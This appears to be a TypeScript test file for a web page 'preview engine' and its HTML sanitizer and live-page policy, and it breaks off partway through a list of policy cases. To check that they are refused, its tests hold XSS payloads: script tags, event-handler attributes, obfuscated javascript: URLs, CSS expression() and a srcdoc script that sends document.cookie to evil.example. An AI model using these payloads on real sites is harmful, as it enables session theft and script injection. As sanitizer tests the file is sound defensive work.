import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import type { MutationProgram } from "@onlay/protocol";
import { Window } from "happy-dom";
import { FRAGMENT_CASES, OP_CASES } from "../../protocol/src/program-rules.cases";
import {
  applyProgramToRoot,
  buildFragment,
  createPreviewEngine,
  type NodeSnapshot,
  type RefusedOp,
} from "./preview-engine";

let win: Window | null = null;

function installDom(): void {
  win = new Window({ url: "http://127.0.0.1:8124/strict.html" });
  const g = globalThis as unknown as {
    window: unknown;
    document: Document;
    Document: typeof Document;
    DOMParser: typeof DOMParser;
    DocumentFragment: typeof DocumentFragment;
    Element: typeof Element;
    HTMLElement: typeof HTMLElement;
    MutationObserver: typeof MutationObserver;
    Node: typeof Node;
    Text: typeof Text;
  };
  g.window = win;
  g.document = win.document as unknown as Document;
  g.Document = win.Document as unknown as typeof Document;
  g.DOMParser = win.DOMParser as unknown as typeof DOMParser;
  g.DocumentFragment = win.DocumentFragment as unknown as typeof DocumentFragment;
  g.Element = win.Element as unknown as typeof Element;
  g.HTMLElement = win.HTMLElement as unknown as typeof HTMLElement;
  g.MutationObserver = win.MutationObserver as unknown as typeof MutationObserver;
  g.Node = win.Node as unknown as typeof Node;
  g.Text = win.Text as unknown as typeof Text;
}

async function flushMutations(): Promise<void> {
  await new Promise((resolve) => setTimeout(resolve, 0));
}

// A page write, then the pass the engines' shared observer runs: most tests
// drive it with `reapply()`. happy-dom holds an observer's record callback only
// through a WeakRef, so once a garbage collection takes it, records stop
// arriving and a test waiting on the observer fails by GC timing alone. Only
// the tests about the observer itself wait for it.

beforeEach(() => installDom());
afterEach(() => {
  win?.happyDOM.cancelAsync();
  win?.close();
  win = null;
});

describe("preview engine", () => {
  test("NodeSnapshot exposes a restore contract", () => {
    const snapshot: NodeSnapshot = { restore() {} };
    expect(() => snapshot.restore()).not.toThrow();
  });

  test("apply setStyle+setClass then restore returns exact prior style/class", () => {
    const target = document.createElement("button");
    target.id = "target";
    target.setAttribute("class", "old keep");
    target.style.setProperty("color", "red");
    target.style.setProperty("background-color", "yellow", "important");
    document.body.append(target);
    const priorClass = target.getAttribute("class");
    const priorStyle = target.getAttribute("style");

    const engine = createPreviewEngine(document);
    const program: MutationProgram = [
      {
        op: "setStyle",
        target: "#target",
        props: [
          { prop: "color", value: "rebeccapurple" },
          { prop: "background-color", value: "white" },
        ],
      },
      { op: "setClass", target: "#target", add: ["preview"], remove: ["old"] },
    ];

    expect(engine.apply(program)).toMatchObject({ ok: true });
    expect(target.className).toBe("keep preview");
    expect(target.style.getPropertyValue("color")).toBe("rebeccapurple");
    expect(target.style.getPropertyValue("background-color")).toBe("white");

    engine.restore();
    expect(target.getAttribute("class")).toBe(priorClass);
    expect(target.getAttribute("style")).toBe(priorStyle);
    expect(engine.active).toBe(false);
  });

  test("buildFragment strips script, event handlers, and dangerous URL schemes", () => {
    const fragment = buildFragment(`
      <div class="safe" onclick="steal()" style="background:url(javascript:steal())">
        <script>alert(1)</script>
        <span data-note="ok" onmouseover="steal()">Safe text</span>
        <a href="java&#x0A;script:alert(1)" title="bad link">link</a>
        <img src="data:text/html,<script>alert(1)</script>" alt="bad image" onerror="steal()">
        <svg><script>alert(1)</script><a xlink:href="javascript:alert(1)">bad</a></svg>
      </div>
    `);

    expect(fragment.querySelector("script")).toBeNull();
    expect(fragment.querySelector("svg")).toBeNull();
    const div = fragment.querySelector("div.safe");
    expect(div).not.toBeNull();
    expect(div?.getAttribute("onclick")).toBeNull();
    expect(div?.getAttribute("style")).toBeNull();
    const span = fragment.querySelector("span");
    expect(span?.textContent).toBe("Safe text");
    expect(span?.getAttribute("onmouseover")).toBeNull();
    expect(span?.getAttribute("data-note")).toBe("ok");
    expect(fragment.querySelector("a")?.getAttribute("href")).toBeNull();
    expect(fragment.querySelector("img")?.getAttribute("src")).toBeNull();
  });

  test("unsafe-only fragments throw and apply returns the named sanitization rejection", () => {
    expect(() =>
      buildFragment(`<script>alert(1)</script><iframe src="javascript:alert(1)"></iframe>`),
    ).toThrow();

    const target = document.createElement("div");
    target.id = "target";
    target.textContent = "Original";
    document.body.append(target);
    const engine = createPreviewEngine(document);

    expect(
      engine.apply([
        {
          op: "insertFragment",
          target: "#target",
          position: "append",
          html: `<svg><script>alert(1)</script></svg>`,
        },
      ]),
    ).toMatchObject({
      ok: true,
      applied: 0,
      refused: [{ index: 0, reason: "fragment-disallowed" }],
    });
    expect(target.textContent).toBe("Original");

    expect(
      engine.apply([{ op: "setAttr", target: "#target", name: "onclick", value: "alert(1)" }]),
    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "attr-rejected" }] });
    expect(target.getAttribute("onclick")).toBeNull();
  });

  test("setAttr rejects srcdoc on live elements without mutating the target", () => {
    const target = document.createElement("iframe");
    target.id = "target";
    target.setAttribute("srcdoc", "<p>safe</p>");
    document.body.append(target);
    const engine = createPreviewEngine(document);

    expect(
      engine.apply([
        {
          op: "setAttr",
          target: "#target",
          name: "srcdoc",
          value: '<script>fetch("//evil.example/?"+document.cookie)</script>',
        },
      ]),
    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "attr-rejected" }] });
    expect(target.getAttribute("srcdoc")).toBe("<p>safe</p>");
    engine.restore();
    expect(target.getAttribute("srcdoc")).toBe("<p>safe</p>");
  });

  test("setAttr rejects attributes outside the shared allow-list", () => {
    const target = document.createElement("div");
    target.id = "target";
    document.body.append(target);
    const engine = createPreviewEngine(document);

    expect(
      engine.apply([{ op: "setAttr", target: "#target", name: "autofocus", value: "true" }]),
    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "attr-rejected" }] });
    expect(target.hasAttribute("autofocus")).toBe(false);
  });

  test("setAttr rejects base href mutation before URL scheme checks", () => {
    const target = document.createElement("base");
    target.id = "target";
    target.setAttribute("href", "/safe-base/");
    document.head.append(target);
    const engine = createPreviewEngine(document);

    expect(
      engine.apply([
        { op: "setAttr", target: "#target", name: "href", value: "https://evil.example/" },
      ]),
    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "attr-rejected" }] });
    expect(target.getAttribute("href")).toBe("/safe-base/");
  });

  test("setAttr permits allow-listed attributes through the shared policy", () => {
    const target = document.createElement("a");
    target.id = "target";
    target.textContent = "Link";
    document.body.append(target);
    const engine = createPreviewEngine(document);

    expect(
      engine.apply([
        { op: "setAttr", target: "#target", name: "href", value: "https://example.com/" },
        { op: "setAttr", target: "#target", name: "aria-label", value: "safe label" },
      ]),
    ).toMatchObject({ ok: true });
    expect(target.getAttribute("href")).toBe("https://example.com/");
    expect(target.getAttribute("aria-label")).toBe("safe label");

    engine.restore();
    expect(target.getAttribute("href")).toBeNull();
    expect(target.getAttribute("aria-label")).toBeNull();
  });

  test("cycling A→B→A restores between switches with no residue", () => {
    const target = document.createElement("p");
    target.id = "target";
    target.className = "base";
    target.textContent = "Original";
    document.body.append(target);
    const engine = createPreviewEngine(document);
    const variantA: MutationProgram = [
      { op: "setText", target: "#target", text: "Variant A" },
      { op: "setClass", target: "#target", add: ["a"], remove: [] },
    ];
    const variantB: MutationProgram = [
      { op: "setText", target: "#target", text: "Variant B" },
      { op: "setClass", target: "#target", add: ["b"], remove: [] },
    ];

    expect(engine.apply(variantA)).toMatchObject({ ok: true });
    expect(target.textContent).toBe("Variant A");
    expect(target.className).toBe("base a");
    expect(engine.apply(variantB)).toMatchObject({ ok: true });
    expect(target.textContent).toBe("Variant B");
    expect(target.className).toBe("base b");
    expect(engine.apply(variantA)).toMatchObject({ ok: true });
    expect(target.textContent).toBe("Variant A");
    expect(target.className).toBe("base a");

    engine.restore();
    expect(target.textContent).toBe("Original");
    expect(target.className).toBe("base");
  });

  test("rejects document-root :scope instead of mutating the whole page", () => {
    const target = document.createElement("p");
    target.id = "target";
    target.textContent = "Original";
    document.body.append(target);
    const before = document.documentElement.innerHTML;
    const engine = createPreviewEngine(document);

    expect(engine.apply([{ op: "setText", target: ":scope", text: "Bad preview" }])).toMatchObject({
      ok: true,
      applied: 0,
      refused: [{ index: 0, reason: "target-missing" }],
    });
    expect(document.documentElement.innerHTML).toBe(before);
    expect(target.textContent).toBe("Original");
  });

  test("a programmatic revert of an active mutation triggers reapply", async () => {
    const target = document.createElement("p");
    target.id = "target";
    target.textContent = "Original";
    document.body.append(target);
    const engine = createPreviewEngine(document);

    expect(
      engine.apply([{ op: "setText", target: "#target", text: "Preview copy" }]),
    ).toMatchObject({
      ok: true,
    });
    target.textContent = "Framework clobbered it";

    await flushMutations();
    expect(target.textContent).toBe("Preview copy");
  });

  test("a reapply on another page takes the program off instead of putting it back (3-E2)", async () => {
    const target = document.createElement("p");
    target.id = "target";
    target.textContent = "Original";
    document.body.append(target);
    let page = "https://app.test/a";
    const engine = createPreviewEngine(document, { pageKey: () => page });
    const r = engine.apply([{ op: "setText", target: "#target", text: "Preview copy" }]);
    expect(r).toMatchObject({ ok: true });
    // The app routes away and re-renders before anything else has run.
    page = "https://app.test/b";
    target.textContent = "Route B's own text";
    engine.reapply();
    expect(target.textContent).toBe("Route B's own text");
    expect(engine.active).toBe(false);
    expect(engine.applied(r.ok ? r.token : 0)).toBe(false);
  });

  test("off the page it was applied on, a write the page did not replace is taken back (3-E2)", async () => {
    document.body.innerHTML = '<p id="a">A</p><p id="b">B</p>';
    let page = "https://app.test/a";
    const engine = createPreviewEngine(document, { pageKey: () => page });
    engine.apply([
      { op: "setText", target: "#a", text: "A preview" },
      { op: "setText", target: "#b", text: "B preview" },
    ]);
    page = "https://app.test/b";
    (document.getElementById("a") as HTMLElement).textContent = "Route B renders #a";
    engine.reapply();
    expect(document.getElementById("a")?.textContent).toBe("Route B renders #a");
    // #b the route left alone: the old page's preview does not stay on it.
    expect(document.getElementById("b")?.textContent).toBe("B");
  });

  test("without a page key reader the engine reapplies as before (the web app's render)", async () => {
    const target = document.createElement("p");
    target.id = "target";
    target.textContent = "Original";
    document.body.append(target);
    const engine = createPreviewEngine(document);
    engine.apply([{ op: "setText", target: "#target", text: "Preview copy" }]);
    target.textContent = "Clobbered";
    engine.reapply();
    expect(target.textContent).toBe("Preview copy");
  });

  test("a node a framework swapped in is snapshotted before the reapply, so restore takes it back", async () => {
    const target = document.createElement("p");
    target.id = "target";
    target.textContent = "Original";
    document.body.append(target);
    const engine = createPreviewEngine(document);

    expect(
      engine.apply([{ op: "setText", target: "#target", text: "Preview copy" }]),
    ).toMatchObject({
      ok: true,
    });
    const replacement = document.createElement("p");
    replacement.id = "target";
    replacement.append("Framework ", document.createElement("b"));
    target.replaceWith(replacement);

    engine.reapply();
    expect(replacement.textContent).toBe("Preview copy");

    engine.restore();
    expect(replacement.textContent).toBe("Framework ");
    expect(replacement.querySelector("b")).not.toBeNull();
    expect(engine.active).toBe(false);
  });

  test("setText restore brings back the element's markup, not just its text", () => {
    const target = document.createElement("p");
    target.id = "target";
    const strong = document.createElement("strong");
    strong.textContent = "bold";
    target.append("Plain ", strong, " tail");
    document.body.append(target);
    const engine = createPreviewEngine(document);

    expect(engine.apply([{ op: "setText", target: "#target", text: "Flat" }])).toMatchObject({
      ok: true,
    });
    engine.restore();
    expect(target.querySelector("strong")).toBe(strong);
    expect(target.textContent).toBe("Plain bold tail");
  });

  test("a reapply that loses a target takes the whole application off and says so", async () => {
    const wrap = document.createElement("div");
    wrap.id = "wrap";
    const first = document.createElement("p");
    first.className = "first";
    first.textContent = "First";
    const second = document.createElement("p");
    second.className = "second";
    second.textContent = "Second";
    wrap.append(first, second);
    document.body.append(wrap);
    const engine = createPreviewEngine(document);
    const result = engine.apply([
      { op: "setStyle", target: ".first", props: [{ prop: "color", value: "red" }] },
      { op: "setText", target: ".second", text: "Changed" },
    ]);
    expect(result).toMatchObject({ ok: true });
    const token = result.ok ? result.token : 0;

    // The framework re-renders: a fresh first, and no second at all.
    const fresh = document.createElement("p");
    fresh.className = "first";
    fresh.textContent = "First again";
    wrap.replaceChildren(fresh);

    engine.reapply();
    // Not the steps the person saw land: nothing of it stays, not even the step that could.
    expect(fresh.style.getPropertyValue("color")).toBe("");
    expect(fresh.textContent).toBe("First again");
    expect(engine.applied(token)).toBe(false);
    expect(engine.active).toBe(false);
  });

  test("insertFragment replace restores the exact pre-preview display state", () => {
    const target = document.createElement("section");
    target.id = "target";
    target.textContent = "Original";
    target.style.setProperty("display", "grid");
    document.body.append(target);
    const priorStyle = target.getAttribute("style");
    const engine = createPreviewEngine(document);

    expect(
      engine.apply([
        {
          op: "insertFragment",
          target: "#target",
          position: "replace",
          html: `<p id="preview-copy">Replacement</p>`,
        },
      ]),
    ).toMatchObject({ ok: true });
    expect(target.style.getPropertyValue("display")).toBe("none");
    expect(target.style.getPropertyPriority("display")).toBe("important");
    expect(document.querySelector("#preview-copy")?.textContent).toBe("Replacement");

    engine.restore();
    expect(document.querySelector("#preview-copy")).toBeNull();
    expect(target.getAttribute("style")).toBe(priorStyle);
    expect(target.textContent).toBe("Original");
  });
});

describe("rooted target resolution (picked element is the program's world)", () => {
  function grid(): { alpha: HTMLElement; beta: HTMLElement } {
    // Two structurally identical cards — the wrong-element hazard fixture.
    document.body.innerHTML = `
      <article class="card"><h2 class="title">Alpha</h2><p class="copy">Alpha copy</p></article>
      <article class="card"><h2 class="title">Beta</h2><p class="copy">Beta copy</p></article>
    `;
    const [alpha, beta] = [...document.querySelectorAll("article.card")] as HTMLElement[];
    if (!alpha || !beta) throw new Error("fixture failed");
    return { alpha, beta };
  }

  test(":scope resolves to the picked element, not <html>", () => {
    grid();
    const engine = createPreviewEngine(document);
    expect(
      engine.apply(
        [{ op: "setText", target: ":scope", text: "Picked" }],
        "article.card:nth-of-type(2)",
      ),
    ).toMatchObject({ ok: true });
    expect(document.querySelectorAll("article.card")[1]?.textContent).toBe("Picked");
    expect(document.querySelectorAll("article.card")[0]?.textContent).toContain("Alpha");
  });

  test("relative selectors resolve inside the ROOT, never the document-first match", () => {
    grid();
    const engine = createPreviewEngine(document);
    // ".title" first-matches Alpha document-wide; rooted at Beta it must hit Beta's title.
    expect(
      engine.apply(
        [{ op: "setText", target: ".title", text: "Beta retitled" }],
        "article.card:nth-of-type(2)",
      ),
    ).toMatchObject({ ok: true });
    expect(document.querySelectorAll(".title")[0]?.textContent).toBe("Alpha");
    expect(document.querySelectorAll(".title")[1]?.textContent).toBe("Beta retitled");
  });

  test("a selector matching the root itself resolves to the root (absolute-selector compat)", () => {
    grid();
    const engine = createPreviewEngine(document);
    expect(
      engine.apply(
        [
          {
            op: "setStyle",
            target: "article.card:nth-of-type(2)",
            props: [{ prop: "color", value: "red" }],
          },
        ],
        "article.card:nth-of-type(2)",
      ),
    ).toMatchObject({ ok: true });
    const beta = document.querySelectorAll("article.card")[1] as HTMLElement;
    expect(beta.style.getPropertyValue("color")).toBe("red");
  });

  test("a target outside the picked element's subtree is target-missing, not a document fallback", () => {
    const { alpha } = grid();
    const engine = createPreviewEngine(document);
    expect(
      engine.apply(
        [{ op: "setText", target: ".copy", text: "hijack" }],
        "article.card:nth-of-type(2) > h2",
      ),
    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "target-missing" }] });
    expect(alpha.querySelector(".copy")?.textContent).toBe("Alpha copy");
  });

  test("an unresolvable root is target-missing (the stale-set signal)", () => {
    grid();
    const engine = createPreviewEngine(document);
    expect(
      engine.apply([{ op: "setText", target: ":scope", text: "stale" }], "#vanished-node"),
    ).toEqual({ ok: false, reason: "target-missing" });
  });

  test("ops can style nodes the program itself inserted BESIDE the root (insert-after sub-flow)", () => {
    grid();
    const engine = createPreviewEngine(document);
    expect(
      engine.apply(
        [
          {
            op: "insertFragment",
            target: ":scope",
            position: "after",
            html: `<aside id="testimonial"><p class="quote">Great.</p></aside>`,
          },
          {
            op: "setStyle",
            target: "#testimonial",
            props: [{ prop: "border", value: "1px solid red" }],
          },
          { op: "setText", target: "#testimonial .quote", text: "Really great." },
        ],
        "article.card:nth-of-type(2)",
      ),
    ).toMatchObject({ ok: true });
    const inserted = document.querySelector("#testimonial") as HTMLElement;
    expect(inserted).not.toBeNull();
    expect(inserted.previousElementSibling?.querySelector(".title")?.textContent).toBe("Beta");
    expect(inserted.style.getPropertyValue("border")).toBe("1px solid red");
    expect(inserted.querySelector(".quote")?.textContent).toBe("Really great.");

    engine.restore();
    expect(document.querySelector("#testimonial")).toBeNull();
  });

  test("reapply keeps rooted resolution after a framework clobber", async () => {
    grid();
    const engine = createPreviewEngine(document);
    expect(
      engine.apply(
        [{ op: "setText", target: ".title", text: "Rooted preview" }],
        "article.card:nth-of-type(2)",
      ),
    ).toMatchObject({ ok: true });
    const betaTitle = document.querySelectorAll(".title")[1] as HTMLElement;
    betaTitle.textContent = "Clobbered";

    engine.reapply();
    expect(document.querySelectorAll(".title")[0]?.textContent).toBe("Alpha");
    expect(document.querySelectorAll(".title")[1]?.textContent).toBe("Rooted preview");
  });
});

describe("applyProgramToRoot (the detached-root applier — the standalone stage)", () => {
  function block(): Element {
    // A captured block, detached: ":scope" IS this root, selectors resolve
    // within it. Parented under a wrapper so before/after/replace have somewhere
    // to land — exactly how the full-page stage mounts it.
    const wrapper = document.createElement("div");
    const root = document.createElement("article");
    root.className = "card";
    root.innerHTML = `<h2 class="title">Original</h2><p class="copy">Body</p>`;
    wrapper.appendChild(root);
    return root;
  }

  test("setText at :scope mutates the root itself", () => {
    const root = block();
    const res = applyProgramToRoot(root, [{ op: "setText", target: ":scope", text: "Picked" }]);
    expect(res).toMatchObject({ applied: 1, misses: 0, rejected: 0 });
    expect(root.textContent).toBe("Picked");
  });

  test("setStyle and setClass on descendants resolve inside the block", () => {
    const root = block();
    const res = applyProgramToRoot(root, [
      { op: "setStyle", target: ".title", props: [{ prop: "color", value: "red" }] },
      { op: "setClass", target: ".copy", add: ["lead"], remove: [] },
    ]);
    expect(res).toMatchObject({ applied: 2, misses: 0, rejected: 0 });
    expect((root.querySelector(".title") as HTMLElement).style.getPropertyValue("color")).toBe(
      "red",
    );
    expect(root.querySelector(".copy")?.className).toBe("copy lead");
  });

  test("insertFragment append/prepend/before/after place nodes correctly", () => {
    const root = block();
    const res = applyProgramToRoot(root, [
      {
        op: "insertFragment",
        target: ".title",
        position: "append",
        html: `<span class="a">A</span>`,
      },
      {
        op: "insertFragment",
        target: ".title",
        position: "prepend",
        html: `<span class="d">D</span>`,
      },
      {
        op: "insertFragment",
        target: ".copy",
        position: "before",
        html: `<span class="b">B</span>`,
      },
      {
        op: "insertFragment",
        target: ".copy",
        position: "after",
        html: `<span class="c">C</span>`,
      },
    ]);
    expect(res).toMatchObject({ applied: 4, misses: 0, rejected: 0 });
    expect(root.querySelector(".title .a")?.textContent).toBe("A");
    expect(root.querySelector(".title")?.firstElementChild?.className).toBe("d");
    expect(root.querySelector(".b")?.nextElementSibling?.classList.contains("copy")).toBe(true);
    expect(root.querySelector(".c")?.previousElementSibling?.classList.contains("copy")).toBe(true);
  });

  test("insertFragment replace hides the target and inserts the fragment beside it", () => {
    const root = block();
    const res = applyProgramToRoot(root, [
      {
        op: "insertFragment",
        target: ".title",
        position: "replace",
        html: `<h2 class="new">New</h2>`,
      },
    ]);
    expect(res).toMatchObject({ applied: 1, misses: 0, rejected: 0 });
    const old = root.querySelector(".title") as HTMLElement;
    expect(old.style.getPropertyValue("display")).toBe("none");
    expect(old.style.getPropertyPriority("display")).toBe("important");
    expect(root.querySelector(".new")?.textContent).toBe("New");
  });

  test("insert-after at :scope lands a sibling beside the root, then later ops style it", () => {
    const root = block();
    const res = applyProgramToRoot(root, [
      {
        op: "insertFragment",
        target: ":scope",
        position: "after",
        html: `<aside id="cta"><p class="q">Quote</p></aside>`,
      },
      { op: "setStyle", target: "#cta", props: [{ prop: "border", value: "1px solid red" }] },
      { op: "setText", target: "#cta .q", text: "Restyled" },
    ]);
    expect(res).toMatchObject({ applied: 3, misses: 0, rejected: 0 });
    const cta = root.parentElement?.querySelector("#cta") as HTMLElement;
    expect(cta).not.toBeNull();
    expect(cta.previousElementSibling).toBe(root);
    expect(cta.style.getPropertyValue("border")).toBe("1px solid red");
    expect(cta.querySelector(".q")?.textContent).toBe("Restyled");
  });

  test("an op that misses inside the block is tallied, not fatal (edits outside the capture)", () => {
    const root = block();
    const res = applyProgramToRoot(root, [
      { op: "setText", target: ".title", text: "kept" },
      { op: "setText", target: ".nowhere", text: "lost" },
    ]);
    expect(res).toMatchObject({ applied: 1, misses: 1, rejected: 0 });
    expect(root.querySelector(".title")?.textContent).toBe("kept");
  });

  test("an unsafe fragment is counted rejected; later ops still apply", () => {
    const root = block();
    const res = applyProgramToRoot(root, [
      {
        op: "insertFragment",
        target: ":scope",
        position: "append",
        html: `<script>alert(1)</script>`,
      },
      { op: "setText", target: ".copy", text: "safe" },
    ]);
    expect(res).toMatchObject({ applied: 1, misses: 0, rejected: 1 });
    expect(root.querySelector(".copy")?.textContent).toBe("safe");
  });

  test("an unsafe setAttr is rejected without mutating the target", () => {
    const root = block();
    const res = applyProgramToRoot(root, [
      { op: "setAttr", target: ":scope", name: "onclick", value: "alert(1)" },
    ]);
    expect(res).toMatchObject({ applied: 0, misses: 0, rejected: 1 });
    expect(root.hasAttribute("onclick")).toBe(false);
  });
});

describe("page roots (spec §8)", () => {
  function page(): void {
    document.body.innerHTML = `<header id="top"><h1 class="title">Store</h1></header><main><p class="copy">Hello</p></main>`;
  }

  test(":scope is the body: styles and appends land there", () => {
    page();
    const engine = createPreviewEngine(document);
    const res = engine.apply(
      [
        { op: "setStyle", target: ":scope", props: [{ prop: "background-color", value: "black" }] },
        { op: "insertFragment", target: ":scope", position: "append", html: "<p id='end'>End</p>" },
        { op: "setText", target: ".title", text: "Shop" },
      ],
      { kind: "page" },
    );
    expect(res).toEqual({ ok: true, token: expect.any(Number), applied: 3 });
    expect(document.body.style.getPropertyValue("background-color")).toBe("black");
    expect(document.body.lastElementChild?.id).toBe("end");
    expect(document.querySelector(".title")?.textContent).toBe("Shop");
    engine.restore();
    expect(document.body.style.getPropertyValue("background-color")).toBe("");
    expect(document.getElementById("end")).toBeNull();
    expect(document.querySelector(".title")?.textContent).toBe("Store");
  });

  test("setText or a replace insert aimed at the body is refused, the rest applies", () => {
    page();
    const engine = createPreviewEngine(document);
    const res = engine.apply(
      [
        { op: "setText", target: ":scope", text: "gone" },
        { op: "insertFragment", target: ":scope", position: "replace", html: "<p>new page</p>" },
        { op: "setText", target: "body", text: "also gone" },
        { op: "setClass", target: ".copy", add: ["lead"], remove: [] },
      ],
      { kind: "page" },
    );
    expect(res).toEqual({
      ok: true,
      token: expect.any(Number),
      applied: 1,
      refused: [
        { index: 0, reason: "page-root-text" },
        { index: 1, reason: "page-root-replace" },
        { index: 2, reason: "page-root-text" },
      ],
    });
    expect(document.querySelector(".title")?.textContent).toBe("Store");
    expect(document.body.style.getPropertyValue("display")).toBe("");
    expect(document.querySelector(".copy")?.className).toBe("copy lead");
  });

  test("a block root keeps its own :scope setText", () => {
    page();
    const engine = createPreviewEngine(document);
    expect(engine.apply([{ op: "setText", target: ":scope", text: "Hi" }], ".copy")).toEqual({
      ok: true,
      token: expect.any(Number),
      applied: 1,
    });
    expect(document.querySelector(".copy")?.textContent).toBe("Hi");
  });

  test("ops past the root's budget are refused: 64 for a block, 256 for the page", () => {
    page();
    const ops = (n: number): MutationProgram =>
      Array.from({ length: n }, (_, i) => ({
        op: "setAttr" as const,
        target: ".copy",
        name: `data-n${i}`,
        value: "1",
      }));
    const block = createPreviewEngine(document);
    const b = block.apply(ops(66), "main");
    expect(b.ok && b.refused?.map((r) => r.index)).toEqual([64, 65]);
    expect(document.querySelector(".copy")?.hasAttribute("data-n63")).toBe(true);
    expect(document.querySelector(".copy")?.hasAttribute("data-n64")).toBe(false);
    block.restore();
    const whole = createPreviewEngine(document);
    const w = whole.apply(ops(70), { kind: "page" });
    expect(w).toEqual({ ok: true, token: expect.any(Number), applied: 70 });
    expect(document.querySelector(".copy")?.hasAttribute("data-n69")).toBe(true);
  });

  test("the detached applier refuses the same page-root ops", () => {
    const body = document.createElement("body");
    body.innerHTML = `<p class="copy">Hello</p>`;
    const res = applyProgramToRoot(
      body,
      [
        { op: "setText", target: ":scope", text: "gone" },
        { op: "setClass", target: ".copy", add: ["x"], remove: [] },
      ],
      { page: true },
    );
    expect(res).toMatchObject({ applied: 1, misses: 0, rejected: 1 });
    expect(body.querySelector(".copy")?.textContent).toBe("Hello");
  });
});

describe("stacked engines on one document", () => {
  test("two engines do not re-trigger each other, and restore in reverse order is exact", async () => {
    document.body.innerHTML = `<p id="t" class="base">Original</p>`;
    const t = document.getElementById("t") as HTMLElement;
    const lower = createPreviewEngine(document);
    const upper = createPreviewEngine(document);
    expect(lower.apply([{ op: "setText", target: "#t", text: "Kept" }])).toMatchObject({
      ok: true,
    });
    expect(
      upper.apply([{ op: "setStyle", target: "#t", props: [{ prop: "color", value: "red" }] }]),
    ).toMatchObject({ ok: true });
    let mutations = 0;
    const counter = new MutationObserver((records) => {
      mutations += records.length;
    });
    counter.observe(document.body, { subtree: true, childList: true, attributes: true });
    await flushMutations();
    await flushMutations();
    // Nothing outside the engines touched the page: no reapply storm.
    expect(mutations).toBe(0);
    counter.disconnect();
    upper.restore();
    lower.restore();
    expect(t.textContent).toBe("Original");
    expect(t.getAttribute("style") ?? "").toBe("");
  });

  test("a framework re-render reapplies every engine in the order they were applied", async () => {
    document.body.innerHTML = `<p id="t">Original</p>`;
    const first = createPreviewEngine(document);
    const second = createPreviewEngine(document);
    second.apply([{ op: "setText", target: "#t", text: "first" }]);
    first.apply([{ op: "setText", target: "#t", text: "second" }]);
    (document.getElementById("t") as HTMLElement).textContent = "Clobbered";
    first.reapply();
    expect(document.getElementById("t")?.textContent).toBe("second");
  });

  test("dispose restores and stops reapplying", async () => {
    document.body.innerHTML = `<p id="t">Original</p>`;
    const engine = createPreviewEngine(document);
    engine.apply([{ op: "setText", target: "#t", text: "Kept" }]);
    engine.dispose();
    expect(document.getElementById("t")?.textContent).toBe("Original");
    (document.getElementById("t") as HTMLElement).textContent = "Page";
    await flushMutations();
    expect(document.getElementById("t")?.textContent).toBe("Page");
  });
});

describe("the live-page policy (what any program may do on someone's page)", () => {
  // The page lives at http://127.0.0.1:8124 and already loads from cdn.example.
  function page(): HTMLElement {
    const cdn = document.createElement("img");
    cdn.setAttribute("src", "https://cdn.example/logo.png");
    document.body.append(cdn);
    const sheet = document.createElement("link");
    sheet.setAttribute("rel", "stylesheet");
    sheet.setAttribute("href", "https://fonts.example/site.css");
    document.head.append(sheet);
    const preconnect = document.createElement("link");
    preconnect.setAttribute("rel", "preconnect");
    preconnect.setAttribute("href", "https://hint.example/");
    document.head.append(preconnect);
    const box = document.createElement("div");
    box.id = "box";
    box.textContent = "Box";
    document.body.append(box);
    const a = document.createElement("a");
    a.id = "link";
    a.textContent = "Link";
    document.body.append(a);
    const img = document.createElement("img");
    img.id = "pic";
    document.body.append(img);
    const style = document.createElement("style");
    style.id = "sheet";
    style.textContent = ".x{color:red}";
    document.body.append(style);
    const noscript = document.createElement("noscript");
    const inner = document.createElement("span");
    inner.id = "inner";
    noscript.append(inner);
    document.body.append(noscript);
    const title = document.createElement("title");
    title.id = "title";
    title.textContent = "Page";
    document.head.append(title);
    return box;
  }

  const frag = (html: string): MutationProgram[number] => ({
    op: "insertFragment",
    target: "#box",
    position: "append",
    html,
  });
  const style = (prop: string, value: string): MutationProgram[number] => ({
    op: "setStyle",
    target: "#box",
    props: [{ prop, value }],
  });

  const cases: Array<{ rule: string; op: MutationProgram[number]; refused: string | null }> = [
    // (a) resources: the page's own origin, or one it already loads from
    { rule: "a: own-origin image", op: frag(`<img src="/local.png">`), refused: null },
    {
      rule: "a: image from an origin the page loads",
      op: frag(`<img src="https://cdn.example/b.png">`),
      refused: null,
    },
    {
      rule: "a: image from a stylesheet origin",
      op: frag(`<img src="https://fonts.example/b.png">`),
      refused: null,
    },
    {
      rule: "a: a preconnect hint does not count",
      op: frag(`<img src="https://hint.example/b.png">`),
      refused: "url-origin",
    },
    {
      rule: "a: image from a new origin",
      op: frag(`<p>hi <img src="https://evil.example/x.png"></p>`),
      refused: "url-origin",
    },
    {
      rule: "a: setAttr src to a new origin",
      op: { op: "setAttr", target: "#pic", name: "src", value: "https://evil.example/p.gif" },
      refused: "url-origin",
    },
    {
      rule: "a: setAttr src to a loaded origin",
      op: { op: "setAttr", target: "#pic", name: "src", value: "https://cdn.example/p.gif" },
      refused: null,
    },
    // (b) links: web, mail and phone
    {
      rule: "b: a web link anywhere",
      op: frag(`<a href="https://anywhere.example/">go</a>`),
      refused: null,
    },
    {
      rule: "b: a mail link",
      op: { op: "setAttr", target: "#link", name: "href", value: "mailto:a@example.com" },
      refused: null,
    },
    // (c) styles
    { rule: "c: a plain declaration", op: style("color", "red"), refused: null },
    { rule: "c: a custom property", op: style("--brand", "#123"), refused: "style-property" },
    {
      rule: "c: an own-origin url()",
      op: style("background-image", "url(/bg.png)"),
      refused: null,
    },
    {
      rule: "c: a data image",
      op: style("background-image", "url(data:image/png;base64,AAAA)"),
      refused: null,
    },
    {
      rule: "c: url() to a new origin",
      op: style("background-image", "url('https://evil.example/t.png')"),
      refused: "style-value",
    },
    {
      rule: "c: an escaped url()",
      op: style("background-image", "u\\72l(https://evil.example/t.png)"),
      refused: "style-value",
    },
    {
      rule: "c: image-set to a new origin",
      op: style("background-image", `image-set("https://evil.example/a.png" 1x)`),
      refused: "style-value",
    },
    { rule: "c: a blob url()", op: style("background", "url(blob:x)"), refused: "style-value" },
    { rule: "c: expression()", op: style("width", "expression(alert(1))"), refused: "style-value" },
    { rule: "c: -moz-binding", op: style("-moz-binding", "none"), refused: "style-value" },
